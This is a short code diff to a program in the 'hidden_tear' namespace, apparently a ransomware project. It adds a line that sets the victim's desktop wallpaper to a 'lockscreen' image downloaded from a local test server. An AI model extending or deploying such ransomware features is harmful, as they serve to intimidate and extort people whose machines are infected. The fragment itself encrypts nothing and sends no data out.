@@ -16,7 +16,10 @@ namespace hidden_tear
         {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
+
+            DesktopBackground.SetFromUrl("http://192.168.0.135:8888/test/lockscreen.bmp");
             Application.Run(new Form1());
+           
         }
     }
 }
